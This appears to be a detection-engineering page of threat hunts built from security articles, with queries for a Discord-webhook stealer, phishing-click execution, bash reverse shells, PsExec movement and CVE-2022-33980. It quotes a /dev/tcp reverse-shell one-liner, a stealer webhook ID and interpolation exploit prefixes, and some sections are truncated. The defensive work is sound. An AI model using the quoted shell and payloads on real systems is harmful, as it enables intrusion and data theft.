Hunts outbound connections to discord.com/api/webhooks or cdn.discordapp.com made by a process that is not a browser or the Discord client — the channel this stealer uses to POST stolen Chrome/Discord/Roblox data (username 'Empyrean') and to pull staged binaries. Optionally pins on the exact webhook ID from the sample. Rationale: main() POSTs results to the hard-coded webhook https://discord.com/api/webhooks/1003603061530431539/... and the google/discord operations exfil via the same URL; a non-browser/non-Discord process reaching discord.com/api/webhooks is the exfil fingerprint, and the literal webhook ID is pinned in the Sentinel proxy query for high-fidelity hits.
ATT&CKT1567 T1102 T1555.003
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Developer or CI tooling (python.exe, node.exe, curl.exe) posting to a legitimate org Discord webhook for build/alert notifications
  • Game launchers or bots embedding Discord Rich Presence over discord.com
  • Electron-based apps other than Discord that bundle Discord SDK
  • Security tooling resolving discord.com for reputation checks
Suppression filter
| where InitiatingProcessFolderPath has "$Windows.~SXK" or InitiatingProcessFileName in~ ("python.exe","pythonw.exe") or InitiatingProcessCommandLine has_any ("ZYXMN","ZYRBX")
Response runbook
Step 1 (triage): Identify the InitiatingProcessFileName/FolderPath — a python.exe or an EXE under C:\$Windows.~SXK posting to discord.com/api/webhooks is malicious; an org-sanctioned CI webhook is not. Where available, confirm the webhook ID matches 1003603061530431539. Step 2 (contain): Isolate host, block the webhook URL/Discord CDN at the proxy for the host, kill the process, and rotate the user's Chrome, Discord, and Roblox credentials plus any payment cards entered in Discord. Step 3 (hunt): Sweep the org for the same webhook ID across proxy logs, and pivot the host to UC1/UC2/UC3 to confirm the full install→inject→exfil chain.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has_any ("discord.com","discordapp.com")
| where InitiatingProcessFileName !in~ ("Discord.exe","DiscordCanary.exe","DiscordPTB.exe","chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| where InitiatingProcessFileName !endswith "$"
| project Timestamp, DeviceName, RemoteUrl, RemoteIP, RemotePort,
          InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by Timestamp desc
ImWebSession
| where TimeGenerated > ago(30d)
| where Url has "discord.com/api/webhooks" or Url has "1003603061530431539"
| project TimeGenerated, SrcHostname, SrcIpAddr, SrcUsername, Url, HttpMethod, HttpRequestHeaderUserAgent, DstHostname
| order by TimeGenerated desc
source:windows.sysmon @EID:3 @DestinationHostname:(discord.com OR *.discordapp.com) -@Image:(*\Discord.exe OR *\chrome.exe OR *\msedge.exe OR *\firefox.exe OR *\brave.exe OR *\DiscordCanary.exe)
#event_simpleName=DnsRequest DomainName=/(discord\.com|discordapp\.com)$/i
| NOT (ContextImageFileName=/\\(Discord|DiscordCanary|DiscordPTB|chrome|msedge|firefox|brave|opera)\.exe$/i)
| groupBy([aid, ComputerName, ContextImageFileName, DomainName], function=count())

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats summariesonly=false earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats summariesonly=false count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats summariesonly=false earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

    base64 / downloadstring in the command line.

Controlling your server with a reverse shell attack

Snyk
2022-08-10 5 use cases 1 technique 4 kill-chain phases detected

Snyk’s Senior Developer Advocate, Brian Vermeer, discusses how reverse shell attacks work and how you can protect yourself from them.

CVEsCVE-2021-44228 CVE-2022-22965 CVE-2022-33980
ATT&CKT1190

Actions on Objectives
Likely
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Server application runtime spawning shell with /dev/tcp redirection (RCE to reverse shell) · Article-specific behavioural hunt — Controlling your server with a reverse shell attack
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Bash reverse shell via /dev/tcp file-descriptor redirection
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Interactive shell process initiating outbound network connection (reverse-shell C2)
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Bash reverse shell via /dev/tcp file-descriptor redirection AIInstallation High
Hunts the exact one-liner shown in the article (exec 5<>/dev/tcp/HOST/PORT; bash -i 5<> /dev/tcp/HOST/PORT 0<&5 1>&5 2>&5) — a process whose command line invokes bash's /dev/tcp or /dev/udp pseudo-device with stdio redirected onto the socket. This pattern is almost never produced by legitimate software, making it a high-fidelity execution signal for an established connect-back shell. Rationale: Anchored on the article's verbatim one-liners 'exec 5<>/dev/tcp/127.0.0.1/9001' and 'bash -i 5<> /dev/tcp/127.0.0.1/9001 0<&5 1>&5 2>&5'; /dev/tcp is a bash-only pseudo-device with effectively no benign command-line presence. Sigma intentionally omitted — SigmaHQ lnx_shell_susp_rev_shells already ships the platform-neutral form. Cross-checked against: • https://attack.mitre.org/techniques/T1059/004/ • https://detection.fyi/sigmahq/sigma/linux/builtin/lnx_shell_susp_rev_shells/
ATT&CKT1059.004 T1571
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Red-team / penetration-test engagements running connect-back shells on in-scope hosts
  • Security training labs or CTF runners executing the Snyk tutorial code itself
  • Bash service-readiness probes using 'echo > /dev/tcp/host/port' in container entrypoint or CI scripts
  • Monitoring health-checks (e.g. simple TCP port checks) implemented with /dev/tcp
Suppression filter
| where ProcessCommandLine has_any ("0<&5","<&5","1>&5","2>&5","0>&1","bash -i") or ProcessCommandLine contains "while read"
Response runbook
1) Triage: pull the full ProcessCommandLine and resolve the destination host/port from the /dev/tcp path; check whether the remote IP is internal, a monitoring target, or external/unknown, and identify the parent process and user. 2) Contain: if the destination is external or unrecognized, isolate the host, kill the shell process tree, and block the remote IP/port at the egress firewall. 3) Hunt: search the same host for the parent that spawned bash (web/app server = likely RCE), for additional /dev/tcp executions, new cron/systemd persistence, and outbound connections from shell processes (see C2 UC).
DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine contains "/dev/tcp/" or ProcessCommandLine contains "/dev/udp/"
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessParentFileName, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where TargetProcessCommandLine contains "/dev/tcp/" or TargetProcessCommandLine contains "/dev/udp/"
| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessName,
          TargetProcessCommandLine, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc
source:(linux.auditd OR linux.syslog) (@process.command_line:*/dev/tcp/* OR @process.command_line:*/dev/udp/*)
#event_simpleName=ProcessRollup2 CommandLine=/\/dev\/(tcp|udp)\//i
| groupBy([aid, ComputerName, UserName, ImageFileName, CommandLine], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as process values(Processes.parent_process_name) as parent_process_name from datamodel=Endpoint.Processes where (Processes.process="*/dev/tcp/*" OR Processes.process="*/dev/udp/*") by Processes.dest Processes.user Processes.process_name | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime) | sort - lastTime
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as process values(Processes.parent_process_name) as parent_process_name from datamodel=Endpoint.Processes where (Processes.process="*/dev/tcp/*" OR Processes.process="*/dev/udp/*") by Processes.dest Processes.user Processes.process_name | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime) | sort - lastTime
Interactive shell process initiating outbound network connection (reverse-shell C2) AICommand & Control Medium
Hunts the network side of the article's attack: a bash/sh/dash/zsh process is the initiator of an outbound TCP connection to a non-loopback host. Interactive shells almost never open their own sockets, so a shell binary egressing to a public address is the connect-back channel the reverse shell establishes. Rationale: Targets the connect-back leg the article describes — bash holding the /dev/tcp socket and egressing to the listener. Loopback (the article's 127.0.0.1 demo) and RFC1918 are excluded to focus on real external C2. Sigma omitted as SigmaHQ net_connection_lnx_back_connect_shell_dev already covers the neutral form; Sentinel left empty because ASIM ImNetworkSession carries no initiating-process attribution to tie the connection to a shell binary. Cross-checked against: • https://detection.fyi/sigmahq/sigma/linux/network_connection/net_connection_lnx_back_connect_shell_dev/ • https://attack.mitre.org/techniques/T1059/004/
ATT&CKT1571 T1095
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Admin/automation 'sh -c curl ...' or 'bash -c wget ...' wrappers reaching internet mirrors
  • Configuration management (Ansible/Salt/Chef) shell modules fetching from external endpoints
  • Package or container init scripts polling external service endpoints over bash /dev/tcp
  • Monitoring health-checks implemented as shell scripts hitting an external host
  • Developer debugging or the Snyk tutorial executed on a server
Suppression filter
| where InitiatingProcessParentFileName !in~ ("ansible","salt-minion","chef-client","puppet","apt","yum","dnf","zabbix_agentd")
Response runbook
1) Triage: capture the shell's InitiatingProcessCommandLine, its parent, the user, and the remote IP:port; geolocate/reputation-check the destination and confirm it is not an approved mirror, repo, or monitoring target. 2) Contain: if the destination is unknown/external, isolate the host, terminate the shell and its parent process tree, and block the IP/port at egress. 3) Hunt: correlate with the /dev/tcp execution UC on the same host, review the spawning parent (app/web server implies RCE), and enumerate persistence (cron, systemd units, ~/.bashrc, authorized_keys) created around the connection time.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where ActionType == "ConnectionSuccess"
| where InitiatingProcessFileName in~ ("bash","sh","dash","zsh","ksh")
| where RemoteIPType == "Public"
| project Timestamp, DeviceName, InitiatingProcessAccountName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessParentFileName, RemoteIP, RemotePort
| order by Timestamp desc

Server application runtime spawning shell with /dev/tcp redirection (RCE to reverse shell) AIExploitation High
Hunts the article's core scenario: an RCE in a server app (Log4Shell-style) where a JVM/Node/Python/PHP/web-server process calls Runtime.exec/os.system/child_process.exec to launch bash with a /dev/tcp connect-back one-liner. The parent=server-runtime + child=shell + /dev/tcp cmdline combination is a strong, low-FP exploitation signal that generic reverse-shell rules miss. Rationale: Maps directly to the article's RCE framing — the Evil ObjectFactory gadget calling Runtime.getRuntime().exec({"/bin/bash","-c","exec 5<>/dev/tcp/..."}) — combining the verbatim /dev/tcp payload with a server-runtime parent that the stock SigmaHQ reverse-shell rules do not constrain on, so this is additive rather than a duplicate. Datadog left empty: the listed linux.auditd standard fields carry no parent-process attribution to express the parent→child pivot. Cross-checked against: • https://attack.mitre.org/techniques/T1190/ • https://attack.mitre.org/techniques/T1059/004/ • https://detection.fyi/sigmahq/sigma/linux/builtin/lnx_shell_susp_rev_shells/
ATT&CKT1190 T1059.004
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Jenkins or other JVM-based CI agents spawning bash that uses /dev/tcp for service-readiness probes
  • Node/Python APM or monitoring agents shelling out for TCP health-checks
  • Developer debugging or the Snyk tutorial code run intentionally on a server
  • Application deploy/init hooks that probe a dependency port via bash /dev/tcp
Suppression filter
| where InitiatingProcessCommandLine !has "readiness" and InitiatingProcessCommandLine !has "healthcheck"
Response runbook
1) Triage: identify the parent runtime and the listening app it serves (web app, API), capture the child shell command line and resolved /dev/tcp destination, and check the app logs around that timestamp for an exploit request (e.g. JNDI/Log4Shell strings, deserialization, template injection). 2) Contain: isolate the host, kill the runtime's spawned shell tree, and block the C2 IP:port at egress; preserve the app process and logs for forensics before any restart. 3) Hunt: confirm the entry vector (vulnerable component/CVE), check other internet-facing hosts running the same app for identical parent→shell /dev/tcp events, and sweep for persistence and lateral movement from the compromised service account.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("java","node","python","python3","php","php-fpm","ruby","httpd","nginx","catalina.sh")
| where FileName in~ ("bash","sh","dash","zsh","ksh")
| where ProcessCommandLine contains "/dev/tcp/" or ProcessCommandLine contains "/dev/udp/"
| project Timestamp, DeviceName, AccountName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName has_any ("java","node","python","python3","php","php-fpm","ruby","httpd","nginx","catalina.sh")
| where TargetProcessName has_any ("bash","sh","dash","zsh","ksh")
| where TargetProcessCommandLine contains "/dev/tcp/" or TargetProcessCommandLine contains "/dev/udp/"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,
          ActingProcessCommandLine, TargetProcessName, TargetProcessCommandLine
| order by TimeGenerated desc
title: Reverse Shell Spawned by Server Application Runtime via /dev/tcp
id: b3f1c7a2-9d4e-4e6a-8c21-7f5a2e1d9c84
status: experimental
description: Detects a server-side application runtime (java, node, python, php, ruby, web server) spawning a Unix shell whose command line uses the bash /dev/tcp or /dev/udp pseudo-device, characteristic of an RCE being weaponised into a connect-back reverse shell.
references:
    - https://snyk.io/blog/reverse-shell-attack/
    - https://attack.mitre.org/techniques/T1190/
author: SOC Detection Engineering
date: 2026/06/29
tags:
    - attack.execution
    - attack.initial_access
    - attack.t1059.004
    - attack.t1190
logsource:
    category: process_creation
    product: linux
detection:
    selection_parent:
        ParentImage|endswith:
            - '/java'
            - '/node'
            - '/python'
            - '/python3'
            - '/php'
            - '/php-fpm'
            - '/ruby'
            - '/httpd'
            - '/nginx'
    selection_child:
        Image|endswith:
            - '/bash'
            - '/sh'
            - '/dash'
            - '/zsh'
            - '/ksh'
    selection_cmd:
        CommandLine|contains:
            - '/dev/tcp/'
            - '/dev/udp/'
    condition: selection_parent and selection_child and selection_cmd
falsepositives:
    - CI/CD agents (e.g. Jenkins on the JVM) running shell readiness probes that use /dev/tcp
    - Application monitoring agents shelling out for TCP health-checks
level: high
#event_simpleName=ProcessRollup2 ParentBaseFileName=/(java|node|python[0-9]*|php(-fpm)?|ruby|httpd|nginx|catalina\.sh)$/i
| ImageFileName=/\/(bash|sh|dash|zsh|ksh)$/i
| regex("/dev/(tcp|udp)/", field=CommandLine)
| groupBy([aid, ComputerName, ParentBaseFileName, ImageFileName, CommandLine], function=count())

Securing PHP containers

Snyk
2022-08-04 5 use cases 1 technique 5 kill-chain phases detected

Too often, developers assume that container isolation means containers are inherently secure. This incorrect assumption leads to complacency. In this post, we’ll explore some best practices for securing PHP containers and avoiding common pitfalls.

ATT&CKT1190
Click any ATT&CK pill below to open it on the Matrix
Phase 1
Reconnaissance
Detected
Phase 2
Weaponization

Phase 3
Delivery
Detected
Phase 4
Exploitation
Detected

Installation
Detected
Phase 6
Command & Control
Likely
Phase 7
Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · Article-specific behavioural hunt — Securing PHP containers
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Remote service execution — PsExec / SMB lateral movement
Remote service execution — PsExec / SMB lateral movement Actions on Objectives High
psexec / paexec / smbexec / wmic /node — service install over SMB from remote host.
ATT&CKT1021.002 T1569.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
   or (FileName =~ "wmic.exe" and ProcessCommandLine has "/node:")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc

SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688            // process-create (audit-policy required)
| where Account !endswith "$"
| where NewProcessName endswith "\psexec.exe"
   or NewProcessName endswith "\psexesvc.exe"
   or NewProcessName endswith "\paexec.exe"
   or (NewProcessName endswith "\wmic.exe" and CommandLine has "/node:")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

Email attachment opened from external sender Delivery High

ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

title: Office Application Spawning Script Host

status: experimental
description: |
    Word/Excel/Outlook/OneNote spawning powershell, cmd, wscript,

Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2021-44228")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2021-44228")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

Exploring CVE-2022-33980: the Apache Commons configuration RCE vulnerability

Snyk
2022-07-08 4 use cases 1 technique 4 kill-chain phases detected

In this post, we’ll explore CVE-2022-33980, the Apache Commons configuration RCE vulnerability. However, we want to make it clear that there’s no need for panic. This is not Log4Shell all over again. This is simple configuration manipulation.

CVEsCVE-2022-33980
ATT&CKT1190
Click any ATT&CK pill below to open it on the Matrix
Phase 1
Reconnaissance
Detected
Phase 2
Weaponization
—
Phase 3
Delivery
—
Phase 4
Exploitation
Detected
Phase 5
Installation
Detected
Phase 6
Command & Control
Detected
Phase 7
Actions on Objectives
Likely
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Apache Commons Configuration interpolation RCE payload in HTTP requests (CVE-2022-33980)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Java (ProcessBuilder) spawning shell/LOLBin child — Commons Config interpolation RCE
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Java process fetching first-seen external URL/DNS — Commons Config url/dns lookup (CVE-2022-33980)
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Apache Commons Configuration interpolation RCE payload in HTTP requests (CVE-2022-33980) AIExploitation Medium
Hunts inbound web traffic carrying Apache Commons Configuration interpolation lookup prefixes (${script:}, ${url:}, ${dns:}, nashorn/javascript engines) that drive CVE-2022-33980 arbitrary code execution. Article-specific because it anchors on the exact default lookup prefixes the JVM resolves at config-parse time, not a generic injection regex. Rationale: Anchors on the exact CVE-2022-33980 lookup prefixes (${script:}, ${url:}, ${dns:}, nashorn) plus their URL-encoded forms confirmed by the GitHub Security Lab advisory and Snyk PoC; these prefixes are the only strings that the vulnerable ConfigurationInterpolator resolves into code/DNS/URL actions. Cross-checked against: • https://securitylab.github.com/advisories/GHSL-2022-017_Apache_Commons_Configuration/ • https://www.sentinelone.com/vulnerability-database/cve-2022-33980/ • https://snyk.io/blog/cve-2022-33980-apache-commons-configuration-rce-vulnerability/
ATT&CKT1190 T1059.007
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Security scanners / pentest tools (Burp, Nuclei) probing for Text4Shell/Commons-Config injection
  • Developers pasting interpolation syntax into search boxes or API test payloads
  • WAF lab traffic replaying known CVE payloads
  • Bug-bounty researchers sending ${...} probes to public endpoints
  • Legitimate apps that echo ${...} template syntax in query parameters
Suppression filter
| where csUserAgent !has "Nuclei" and csUserAgent !has "nessus" and csUserAgent !has "burp"
Response runbook
1) Triage: pull the full request (method, body, source IP, user-agent) and confirm whether the receiving app embeds Apache Commons Configuration 2.4–2.7; check scStatus — a 200/500 after the payload suggests the interpolator was reached. 2) Contain: block the source IP at the WAF and add a virtual patch rule denying ${script|url|dns:} in request data; isolate the app host if a child process fired (pivot to UC2). 3) Hunt: search all web logs for the same source IP and for the other lookup prefixes; pivot to endpoint for java.exe spawning shells and outbound URL/DNS fetches on the same host.
W3CIISLog
| where TimeGenerated > ago(7d)
| where csUriQuery contains "${script:" or csUriQuery contains "${url:" or csUriQuery contains "${dns:" or csUriQuery contains "nashorn:"
    or csUriStem contains "${script:" or csUriStem contains "${url:" or csUriStem contains "${dns:"
    or csUriQuery contains "%24%7bscript" or csUriQuery contains "%24%7burl" or csUriQuery contains "%24%7bdns"
| project TimeGenerated, Computer, cIP, csMethod, csUriStem, csUriQuery, csUserAgent, scStatus
| order by TimeGenerated desc

Java (ProcessBuilder) spawning shell/LOLBin child — Commons Config interpolation RCE AIInstallation High
